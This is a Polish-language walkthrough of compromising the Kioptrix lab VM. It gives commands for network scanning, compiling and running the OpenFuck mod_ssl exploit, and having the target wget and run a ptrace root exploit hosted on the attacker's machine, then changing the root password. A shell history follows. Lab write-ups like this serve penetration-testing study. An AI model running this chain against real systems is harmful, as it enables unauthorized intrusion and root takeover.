1. Rozpoznanie (Kali Linux)
Sprawdzenie swojego IP i znalezienie ofiary w sieci.

ip a – Sprawdzenie własnego adresu IP.

sudo netdiscover -r 192.168.64.0/24 – Skanowanie sieci (zakładając, że to Twoja podsieć) w poszukiwaniu Kioptrixa.

nmap -sV [IP_OFIARY] – Skanowanie portów i wersji usług (wykrycie starego Apache/mod_ssl).

2. Przygotowanie exploita "OpenFuck" (Kali Linux)
Ponieważ stary kod z searchsploit nie chciał się kompilować, użyłeś wersji z GitHuba.

git clone https://github.com/exploit-inters/openfuck – Pobranie naprawionego kodu.

cd openfuck – Wejście do katalogu.

gcc -o OpenFuck OpenFuck.c -lcrypto – Kompilacja exploita (linkowanie biblioteki krypto).

3. Atak wstępny i problem z "ptrace" (Kali Linux -> Kioptrix)
Uruchomienie exploita. W Twoim przypadku automatyczne pobieranie drugiego pliku nie zadziałało, więc musieliśmy to zrobić ręcznie.

./OpenFuck 0x6b [IP_OFIARY] -c 40 – Uruchomienie exploita (parametry 0x6b to RedHat, -c 40 to wersja połączenia – te wartości mogły się różnić zależnie od wersji exploita, ale to standard).

(W tym momencie uzyskałeś dostęp jako zwykły użytkownik, ale nie root).

4. Ręczne wgranie exploita na roota (Hostowanie plików)
Ponieważ Kioptrix nie mógł pobrać pliku sam, wystawiłeś go na swoim komputerze.

Na Kali Linux (w folderze z plikiem ptrace-kmod.c):

python3 -m http.server 80 – Uruchomienie prostego serwera WWW.

Na Kioptrixie (w oknie terminala, które zdobyłeś):

cd /tmp – Przejście do katalogu tymczasowego (tylko tam można pisać).

wget http://[TWÓJ_IP_KALI]/ptrace-kmod.c – Pobranie pliku z Twojego serwera.

gcc -o exploit ptrace-kmod.c – Skompilowanie exploita na maszynie ofiary.

./exploit – Uruchomienie.

5. Post-eksploitacja (Kioptrix - ROOT)
Działania po zdobyciu znaku zachęty #.

whoami – Potwierdzenie uprawnień (wynik: root).

passwd – Zmiana hasła roota na własne.


## Wynik komendy history:

  450  ip a
  451  sudo netdiscover -r 192.168.64.0/24
  452  nmap -sV 192.168.64.5
  453  searchsploit mod_ssl 2.8
  454  searchsploit -m 47080.c
  455  git clone https://github.com/exploit-inters/openfuck
  456  cd openfuck/
  457  gcc -o OpenFuck OpenFuck.c -lcrypto
  458  ./OpenFuck 0x6b 192.168.64.5 -c 40
  459  cd ..
  460  python3 -m http.server 80